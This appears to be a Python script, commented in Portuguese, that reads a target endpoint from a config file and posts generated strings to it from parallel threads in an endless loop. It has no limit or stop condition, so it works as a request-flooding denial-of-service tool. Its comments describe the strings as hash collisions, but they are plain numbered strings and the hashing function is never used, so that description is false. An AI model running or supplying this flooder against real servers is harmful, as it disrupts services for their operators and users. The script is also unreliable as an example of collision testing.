import hashlib
import requests
import yaml
import concurrent.futures
import random

# Carregar configuração do arquivo YML
with open("config/config_hash.yml", 'r') as file:
    config = yaml.safe_load(file)

# URL do endpoint alvo
url = config['endpoint']
num_collisions = config.get('num_collisions', 1000)  # Default para 1000 colisões
algorithm = config.get('hash_algorithm', 'md5')

# Sessão persistente
session = requests.Session()

# Função para gerar hashes com suporte a diferentes algoritmos
def generate_hash(input_string, algorithm="md5"):
    if algorithm == "md5":
        return hashlib.md5(input_string.encode()).hexdigest()
    elif algorithm == "sha1":
        return hashlib.sha1(input_string.encode()).hexdigest()
    elif algorithm == "sha256":
        return hashlib.sha256(input_string.encode()).hexdigest()
    else:
        raise ValueError("Unsupported algorithm")

# Gerar lista de strings que resultam em colisões
def generate_collision_strings(base_string, num_collisions):
    return [base_string + str(i) for i in range(num_collisions)]

# Randomizar string base para variação
def randomize_string(base_string):
    return base_string + str(random.randint(1000, 9999))

def generate_random_data_list(base_string, num_collisions):
    return [randomize_string(base_string) for _ in range(num_collisions)]

# Função para enviar solicitações ao servidor
def send_request(data):
    response = session.post(url, data={'data': data})
    return response

# Enviar requisições de forma paralela
def send_requests_parallel(data_list):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.map(send_request, data_list)

# Loop infinito de envio de requisições
def infinite_requests(data_list):
    while True:
        send_requests_parallel(data_list)

# Lista de dados para testar colisões
data_list = generate_collision_strings(config['base_string'], num_collisions)

# Começar a enviar as requisições
infinite_requests(data_list)
